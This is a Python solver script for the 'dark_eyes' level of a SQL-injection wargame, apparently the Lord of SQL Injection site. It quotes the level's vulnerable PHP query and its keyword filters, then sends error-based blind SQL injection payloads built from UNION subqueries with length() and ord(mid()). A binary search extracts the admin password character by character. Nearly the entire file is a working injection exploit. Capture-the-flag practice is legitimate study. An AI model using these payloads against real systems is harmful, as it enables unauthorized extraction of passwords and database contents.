#!/usr/bin/env python3
import pickle
import los
from getpass import getpass


def check_func(response: str) -> bool:
    return 'select id from prob_dark_eyes' in response


def main():
    '''
    Dark_eyes

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
    if(preg_match('/col|if|case|when|sleep|benchmark/i', $_GET[pw])) exit("HeHe");
    $query = "select id from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(mysqli_error($db)) exit();
    echo "<hr>query : <strong>{$query}</strong><hr><br>";

    $_GET[pw] = addslashes($_GET[pw]);
    $query = "select pw from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("dark_eyes");
    '''

    url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    if "location.href='../';" in los.get_request(url, {}, cook, print_param=False):
        print('you need to login in browser')
        exit(1)

    payload = "'||id='admin'&&(select 1 union select (length(pw)>%s))#"
    param = dict(pw=payload)
    len_of_key = los.find_key_len(url, param, check_func, cook)

    print(len_of_key)

    payload = "'||id='admin'&&(select 1 union select (ord(mid(pw,%s,1))%s))#"
    param = dict(pw=payload)
    result = los.find_binary(url, param, check_func,
                             32, 127, len_of_key, cook)

    param = dict(pw=result)
    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Dark_eyes Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()
